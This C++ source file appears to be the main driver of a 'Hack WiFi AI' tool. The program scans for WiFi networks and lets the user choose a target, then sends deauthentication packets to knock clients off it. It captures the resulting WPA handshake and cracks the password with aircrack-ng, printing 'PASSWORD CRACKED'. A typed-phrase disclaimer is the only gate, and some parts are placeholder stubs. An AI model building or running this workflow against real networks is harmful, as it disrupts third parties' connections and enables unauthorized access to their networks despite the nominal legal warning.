#include "../include/HackWifiAI.h"
#include <iostream>
#include <iomanip>
#include <sstream>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <algorithm>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

HackWifiAI::HackWifiAI()
    : scanner_(std::make_unique<WiFiScanner>())
    , capturer_(std::make_unique<HandshakeCapturer>())
    , deauth_(std::make_unique<DeauthAttacker>())
    , cracker_(std::make_unique<AICrackEngine>())
    , analyzer_(std::make_unique<SecurityAnalyzer>()) {
}

int HackWifiAI::run() {
    try {
        displayBanner();
        
        if (!showLegalWarning()) {
            std::cout << "\n❌ Operation cancelled. Legal compliance required." << std::endl;
            return 1;
        }
        
        if (!setupEnvironment()) {
            return 1;
        }
        
        std::vector<WiFiNetwork> networks = scanNetworks();
        if (networks.empty() || !selectTarget(networks)) {
            return 1;
        }
        
        if (!captureHandshake()) {
            cleanup();
            return 1;
        }
        
        std::string password = crackPassword();
        SecurityReport report = runSecurityAnalysis();
        
        displayResults(password, report);
        cleanup();
        
        return 0;
    } catch (const std::exception& e) {
        std::cerr << "\n❌ Error: " << e.what() << std::endl;
        cleanup();
        return 1;
    } catch (...) {
        std::cerr << "\n❌ Unknown error occurred" << std::endl;
        cleanup();
        return 1;
    }
}

void HackWifiAI::displayBanner() const {
    std::cout << "\n" << std::string(70, '=') << std::endl;
    std::cout << "🔐 HACK WIFI AI - Advanced WiFi Security Testing Tool" << std::endl;
    std::cout << "🤖 AI-Powered Password Cracking & Security Assessment" << std::endl;
    std::cout << "🎯 Educational Use Only - Version 2025.1" << std::endl;
    std::cout << std::string(70, '=') << std::endl;
}

bool HackWifiAI::showLegalWarning() const {
    std::cout << "\n⚖️  LEGAL DISCLAIMER:" << std::endl;
    std::cout << "THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY!" << std::endl;
    std::cout << "UNAUTHORIZED ACCESS TO WIFI NETWORKS IS ILLEGAL!" << std::endl;
    
    std::cout << "\n✅ PERMITTED USES:" << std::endl;
    std::cout << "  - Testing your own WiFi networks" << std::endl;
    std::cout << "  - Authorized penetration testing with written permission" << std::endl;
    std::cout << "  - Educational security awareness" << std::endl;
    
    std::cout << "\n❌ PROHIBITED USES:" << std::endl;
    std::cout << "  - Unauthorized network access" << std::endl;
    std::cout << "  - Malicious hacking activities" << std::endl;
    std::cout << "  - Any illegal activities" << std::endl;
    
    std::cout << "\nType 'AUTHORIZED TESTING' to continue: ";
    std::string confirm;
    std::getline(std::cin, confirm);
    
    return confirm == "AUTHORIZED TESTING";
}

bool HackWifiAI::setupEnvironment() {
    std::cout << "\n🔧 Setting up environment..." << std::endl;
    
    if (!isRunningAsRoot()) {
        std::cerr << "❌ Root/Administrator privileges required." << std::endl;
#ifdef _WIN32
        std::cerr << "   Please run as Administrator." << std::endl;
#else
        std::cerr << "   Please run with sudo." << std::endl;
#endif
        return false;
    }
    
    if (!checkRequiredTools()) {
        std::cerr << "❌ Required tools are missing. Please install them first." << std::endl;
        return false;
    }
    
    // For this example, we'll use a default interface
    // In a real implementation, you would detect available interfaces
    interface_ = "wlan0";
    
    std::cout << "📡 Using interface: " << interface_ << std::endl;
    return true;
}

std::vector<WiFiNetwork> HackWifiAI::scanNetworks() {
    std::cout << "\n📶 Scanning for WiFi networks..." << std::endl;
    
    std::vector<WiFiNetwork> networks = scanner_->scanNetworks(interface_);
    
    if (networks.empty()) {
        std::cout << "❌ No WiFi networks found." << std::endl;
        return {};
    }
    
    std::cout << "\nFound " << networks.size() << " networks:" << std::endl;
    std::cout << " #  " << std::left << std::setw(20) << "SSID" 
              << std::setw(18) << "BSSID" 
              << std::setw(8) << "Signal" 
              << std::setw(15) << "Security" << std::endl;
    std::cout << std::string(60, '-') << std::endl;
    
    for (size_t i = 0; i < networks.size() && i < 15; ++i) {
        const auto& net = networks[i];
        std::cout << std::right << std::setw(2) << (i + 1) << ". "
                  << std::left << std::setw(20) << net.ssid.substr(0, 17) + (net.ssid.length() > 17 ? "..." : "")
                  << std::setw(18) << net.bssid
                  << std::setw(8) << (std::to_string(net.signal) + "%")
                  << std::setw(15) << net.security << std::endl;
    }
    
    return networks;
}

bool HackWifiAI::selectTarget(const std::vector<WiFiNetwork>& networks) {
    std::cout << "\n🎯 Select target network (1-" << std::min(networks.size(), static_cast<size_t>(15)) << "): ";
    
    int selection;
    if (!(std::cin >> selection) || selection < 1 || selection > static_cast<int>(networks.size())) {
        std::cerr << "❌ Invalid selection" << std::endl;
        return false;
    }
    
    // Clear the input buffer
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    
    targetNetwork_ = networks[selection - 1];
    std::cout << "✅ Target: " << targetNetwork_.ssid << " (" << targetNetwork_.bssid << ")" << std::endl;
    return true;
}

bool HackWifiAI::captureHandshake() {
    std::cout << "\n🎣 Attempting to capture WPA handshake..." << std::endl;
    std::cout << "   Target: " << targetNetwork_.ssid << std::endl;
    std::cout << "   Channel: " << targetNetwork_.channel << std::endl;
    
    // Start handshake capture
    if (!capturer_->startCapture(interface_, targetNetwork_.bssid, targetNetwork_.channel)) {
        std::cerr << "❌ Failed to start capture" << std::endl;
        return false;
    }
    
    // Start deauthentication attack
    std::cout << "⚡ Sending deauth packets to force handshake..." << std::endl;
    deauth_->startDeauthAttack(interface_, targetNetwork_.bssid, "", 30);
    
    // Monitor for handshake
    std::cout << "⏳ Waiting for WPA handshake (30 seconds)..." << std::endl;
    bool handshakeCaptured = false;
    
    for (int i = 30; i > 0; --i) {
        std::cout << "\r   " << i << "s remaining..." << std::flush;
        
        if (capturer_->checkHandshake()) {
            handshakeCaptured = true;
            break;
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    // Stop attacks
    deauth_->stopAttack();
    capturer_->stopCapture();
    
    if (handshakeCaptured) {
        captureFile_ = capturer_->getCaptureFile();
        std::cout << "\n✅ WPA handshake captured: " << captureFile_ << std::endl;
        return true;
    } else {
        std::cout << "\n❌ No handshake captured" << std::endl;
        return false;
    }
}

std::string HackWifiAI::crackPassword() {
    std::cout << "\n🤖 Starting AI-powered password cracking..." << std::endl;
    std::cout << "   Target: " << targetNetwork_.ssid << std::endl;
    
    // In a real implementation, we would generate an AI wordlist here
    // For this example, we'll use a placeholder
    std::string wordlistFile = "ai_wordlist.txt";
    
    std::cout << "🔓 Launching aircrack-ng with AI wordlist..." << std::endl;
    return cracker_->crackHandshake(captureFile_, wordlistFile, targetNetwork_.ssid);
}

SecurityReport HackWifiAI::runSecurityAnalysis() {
    std::cout << "\n🔍 Running security analysis..." << std::endl;
    SecurityReport report = analyzer_->analyzeNetwork(targetNetwork_);
    analyzer_->generateReport(report);
    return report;
}

void HackWifiAI::displayResults(const std::string& password, const SecurityReport& report) const {
    std::cout << "\n" << std::string(60, '=') << std::endl;
    std::cout << "🎯 HACK WIFI AI - RESULTS" << std::endl;
    std::cout << std::string(60, '=') << std::endl;
    
    if (!password.empty()) {
        std::cout << "✅ PASSWORD CRACKED: " << password << std::endl;
    } else {
        std::cout << "❌ Password not found with AI attack" << std::endl;
        std::cout << "💡 Try with a larger wordlist or different AI strategy" << std::endl;
    }
    
    std::cout << "\n📊 Security Assessment:" << std::endl;
    std::cout << "   SSID: " << report.ssid << std::endl;
    std::cout << "   BSSID: " << report.bssid << std::endl;
    std::cout << "   Security Level: " << report.securityLevel << std::endl;
    std::cout << "   Risk Score: " << report.riskScore << "/100" << std::endl;
    
    if (!report.vulnerabilities.empty()) {
        std::cout << "\n🔴 VULNERABILITIES:" << std::endl;
        for (const auto& vuln : report.vulnerabilities) {
            std::cout << "   • " << vuln << std::endl;
        }
    }
    
    if (!report.recommendations.empty()) {
        std::cout << "\n✅ RECOMMENDATIONS:" << std::endl;
        for (const auto& rec : report.recommendations) {
            std::cout << "   • " << rec << std::endl;
        }
    }
}

void HackWifiAI::cleanup() const {
    // In a real implementation, we would clean up resources here
    // For example, disable monitor mode, close files, etc.
    std::cout << "\n🧹 Cleaning up resources..." << std::endl;
}

bool HackWifiAI::isRunningAsRoot() const {
#ifdef _WIN32
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    
    if (AllocateAndInitializeSid(
            &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }
    
    return isAdmin != FALSE;
#else
    return geteuid() == 0;
#endif
}

bool HackWifiAI::checkRequiredTools() const {
    const std::vector<std::string> requiredTools = {
        "airodump-ng",
        "aireplay-ng",
        "aircrack-ng"
    };
    
    bool allToolsFound = true;
    
    for (const auto& tool : requiredTools) {
        std::string command;
#ifdef _WIN32
        command = "where " + tool + " >nul 2>nul";
#else
        command = "which " + tool + " >/dev/null 2>&1";
#endif
        
        int result = std::system(command.c_str());
        if (result != 0) {
            std::cerr << "❌ Missing tool: " << tool << std::endl;
            allToolsFound = false;
        }
    }
    
    return allToolsFound;
}
